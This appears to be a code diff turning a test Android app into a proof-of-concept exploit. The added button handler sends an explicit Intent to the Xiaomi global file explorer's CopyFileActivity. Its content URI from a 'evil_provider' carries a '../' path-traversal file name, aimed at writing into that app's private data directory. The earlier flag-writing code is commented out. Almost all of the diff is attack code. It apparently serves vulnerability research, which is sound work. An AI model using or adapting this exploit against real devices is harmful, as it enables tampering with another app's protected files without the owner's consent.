@@ -1,7 +1,12 @@
 package com.example.victim;
 
+import android.content.ComponentName;
+import android.content.Intent;
+import android.net.Uri;
 import android.os.Bundle;
 import android.util.Log;
+import android.view.View;
+import android.widget.Button;
 
 import androidx.activity.EdgeToEdge;
 import androidx.appcompat.app.AppCompatActivity;
@@ -28,18 +33,35 @@ public class MainActivity extends AppCompatActivity {
             return insets;
         });
 
-        File filesDir = getFilesDir();
+        Button btn = findViewById(R.id.button);
 
-        File flagFile = new File(filesDir, "flag");
+        btn.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Intent intent = new Intent();
+                intent.setAction(Intent.ACTION_SEND);
+                intent.setComponent(new ComponentName("com.mi.android.globalFileexplorer", "com.android.fileexplorer.activity.CopyFileActivity"));
 
-        try (FileOutputStream fos = new FileOutputStream(flagFile)) {
-            String content = "flag{test_______flag}";
-            fos.write(content.getBytes());
-            Log.d(TAG, "文件写入成功，路径：" + flagFile.getAbsolutePath());
-        } catch (IOException e) {
-            Log.e(TAG, "文件写入失败", e);
-            e.printStackTrace();
-        }
+                intent.setData(Uri.parse("content://evil_provider/files/test.txt?path=" + getFilesDir()
+                        + "/test.txt" + "&name=../../../../../../../../data/user/0/com.mi.android.globalFileexplorer/files/test.txt"
+                        + "&size=10"));
+                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                startActivity(intent);
+            }
+        });
+
+//        File filesDir = getFilesDir();
+//
+//        File flagFile = new File(filesDir, "flag");
+//
+//        try (FileOutputStream fos = new FileOutputStream(flagFile)) {
+//            String content = "flag{test_______flag}";
+//            fos.write(content.getBytes());
+//            Log.d(TAG, "文件写入成功，路径：" + flagFile.getAbsolutePath());
+//        } catch (IOException e) {
+//            Log.e(TAG, "文件写入失败", e);
+//            e.printStackTrace();
+//        }
 
     }
 }
